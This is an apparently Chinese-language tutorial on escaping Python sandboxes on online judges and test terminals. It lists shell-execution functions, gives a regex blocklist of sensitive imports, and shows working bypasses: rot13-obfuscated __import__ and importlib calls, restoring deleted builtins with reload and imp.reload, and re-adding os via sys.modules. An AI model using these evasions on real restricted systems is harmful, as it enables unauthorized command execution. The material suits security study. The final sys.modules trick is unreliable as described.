Python的沙箱逃逸是一些OJ,Quantor网站渗透测试的重要渠道,本篇文章主要从一些语言特性和一些技巧上来讲解python的一些元知识以及如何突破限制达到我们渗透的目的
# 0x00 python沙箱逃逸概述
沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程
对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个
  * 使用os包中的popen,system两个函数来直接执行shell
  * 使用commands模块中的方法
  * 使用subprocess
  * 使用写文件到指定位置,再使用其他辅助手段  
总体来说,我们使用以下几个函数,就可以直接愉快的拿到shell啦!
    import os
    import subprocess
    import commands
    # 直接输入shell命令,以ifconfig举例
    os.system('ifconfig')
    os.popen('ifconfig')
    commands.getoutput('ifconfig')
    commands.getstatusoutput('ifconfig')
    subprocess.call(['ifconfig'],shell=True)
但是,可以确定的是,防御者是不会这么轻易的让我们直接拿到shell的,肯定会有各种过滤,对代码进行各种各样的检查,来阻止可能的进攻  
防御者会怎么做呢
# 0x01 import相关的基础
对于防御者来说,最基础的思路,就是对代码的内容进行检查  
**最常见的方法呢,就是禁止引入敏感的包**
    import re
    code = open('code.py').read()
    pattern  = re.compile('import\s+(os|commands|subprocess|sys)')
    match = re.search(pattern,code)
    if match:
        print "forbidden module import detected"
        raise Exception
用以上的几行代码,就可以简单的完成对于敏感的包的检测
我们知道,要执行shell命令,必须引入 os/commands/subprocess这几个包,  
对于攻击者来说,改如何绕过呢,必须使用其他的引入方式
  1. import 关键字
  2. __import__函数
  3. importlib库
import 是一个关键字,因此,包的名字是直接以
'tag'(标记)的方式引入的,但是对于函数和包来说,引入的包的名字就是他们的参数,也就是说,将会以字符串的方式引入  
我们可以对原始关键字做出种种处理来bypass掉源码扫描
以__import__函数举例
    f3ck = __import__("pbzznaqf".decode('rot_13'))
    print f3ck.getoutput('ifconfig')
    enp9s0: flags=4099  mtu 1500
            ether f0:xx:1c:xx:xx:71  txqueuelen 1000  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    lo: flags=73  mtu 65536
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10
            loop  txqueuelen 1  (Local Loopback)
            RX packets 822  bytes 735401 (718.1 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 822  bytes 735401 (718.1 KiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
可以看到,成功的执行了命令
或者使用importlib 这一个库
    import importlib
    f3ck = importlib.import_module("pbzznaqf".decode('rot_13')
    print f3ck.getoutput('ifconfig')
将获得同样的效果
# 0x02 import进阶
在python中,我们知道,不用引入直接使用的内置函数称为 **builtin** 函数,随着`__builtin__`这一个module
自动被引入到环境中
(在python3.x 版本中,`__builtin__`变成了`builtins`,而且需要引入)
因此,`open()`,`int()`,`chr()`这些函数,就相当于
    __builtin__.open()
    __builtin__.int()
    __builtin__.chr()
如果我们把这些函数从`__builtin__`中删除,那么就不能够再直接使用了
    In [6]: del __builtin__.chr
    In [7]: chr(1)
    ---------------------------------------------------------------------------    NameError                                 Traceback (most recent call last)
     in ()
    ----> 1 chr(1)
    NameError: name 'chr' is not defined
同样,刚才的`__import__`函数,同样也是一个builtin函数,同样,常用的危险函数`eval`,`exec`,`execfile`也是`__builtin__`的,因此只要从`__builtin__`中删除这些东西,那么就不能再去使用了
**但是攻击者岂能善罢甘休,必然会找出各种绕过的方式,这种防御,我们该如何去绕过呢?**
我们知道,`__builtin__`是一个默认引入的module  
对于模块,有一个函数`reload`用于重新从文件系统中的代码来载入模块
因此我们只需要
    reload(__builtin__)
就可以重新得到完整的`__builtin__`模块了
**但是,`reload`也是`__builtin__`下面的函数,如果直接把它干掉,就没办法重新引入了
    In [8]: del __builtin__.reload
    In [9]: reload
    ---------------------------------------------------------------------------    NameError                                 Traceback (most recent call last)
     in ()
    ----> 1 reload
    NameError: name 'reload' is not defined
这个时候,我们该怎么呢  
在python中,有一个模块叫做imp,是有关引入的一个模块  
我们可以使用
    import imp
    imp.reload(__builtin__)
然后我们就会重新得到完整的`__builtin__`模块了
# 0x03 import高级
前面的一些防护和攻击,都是针对
引入函数进行的，然而，彻底想想这个关于import的问题，我们能引入进来一个包，说明这个包已经预先在一个位置了，所以我们才能引入进来，否则就会像没有安装这个包的时候，报一个未找到的错误
如果我们从某个地方彻底把这个包删除，那就可以禁止了引入
那么，包的内容被存放在哪里呢？
我们知道，通过pip安装的package都会被放在以下几个路径之一,以2.7为例
    /usr/local/lib/python2.7/dist-packages
    /usr/local/lib/python2.7/site-packages
    ~/.local/lib/python2.7/site-packages
一般系统相关的包都在sys下,环境变量或者说系统路径肯定也是在下面.  
我们可以看到sys下面有一个list叫做path,查看里面的内容,果然是默认路径
    In [8]: sys.path
    Out[8]: 
    ['',
     '/usr/local/bin',
     '/usr/lib/python2.7',
     '/usr/lib/python2.7/plat-x86_64-linux-gnu',
     '/usr/lib/python2.7/lib-tk',
     '/usr/lib/python2.7/lib-old',
     '/usr/lib/python2.7/lib-dynload',
     '/home/centurio/.local/lib/python2.7/site-packages',
     '/usr/local/lib/python2.7/dist-packages',
     '/usr/lib/python2.7/dist-packages',
     '/usr/lib/python2.7/dist-packages/gtk-2.0',
     '/usr/lib/python2.7/dist-packages/IPython/extensions']
我们还可以看到,sys下面有一个modules,看一下这个
    {'copy_reg': , 'sre_compile': , '_sre': , 'encodings': , 'site': , '__builtin__': , 'sysconfig': , 'encodings.encodings': None, '__main__': , 'ruamel': , 'abc': , 'posixpath': , '_weakrefset': , 'errno': , 'encodings.codecs': None, 'sre_constants': , 're': , '_abcoll': , 'types': , '_codecs': , 'encodings.__builtin__': None, '_warnings': , 'genericpath': , 'stat': , 'zipimport': , '_sysconfigdata': , 'mpl_toolkits': , 'warnings': , 'UserDict': , 'encodings.utf_8': , 'sys': , 'codecs': , 'readline': , '_sysconfigdata_nd': , 'os.path': , 'phply': , '_locale': , 'sitecustomize': , 'signal': , 'traceback': , 'linecache': , 'posix': , 'encodings.aliases': , 'exceptions': , 'sre_parse': , 'os': , '_weakref': }
果然,这个就是我们要找的东西了,接下来,我们对`sys.modules`做一些改动,看看还能否引入
    >>> sys.modules['os']=None
    >>> import os
    Traceback (most recent call last):
      File "", line 1, in 
    ImportError: No module named os
    >>> __import__('os')
    Traceback (most recent call last):
      File "", line 1, in 
    ImportError: No module named os
    >>> import importlib
    >>> importlib.import_module('os')
    Traceback (most recent call last):
      File "", line 1, in 
      File "importlib/__init__.py", line 37, in import_module
        __import__(name)
    ImportError: No module named os
果然如我们所料,将os从`sys.modules`中删掉之后,就不能再引入了
那攻击者该如何应对呢?
> Python import 的步骤  
>  python 所有加载的模块信息都存放在 sys.modules 结构中，当 import 一个模块时，会按如下步骤来进行  
>  如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A  
>  如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 **dict** 中
见招拆招,你删掉了,我加回来就是了,如果`sys.modules`中不存在,那么会自动加载,我们把路径字符串放进去试一试?  
在所有的类unix系统中,Python的os模块的路径几乎都是`/usr/lib/python2.7/os.py`中
    >>> import sys
    >>> sys.modules['os']='/usr/lib/python2.7/os.py'
    >>> import os
    >>>
果然,我们亲爱的os又回来了!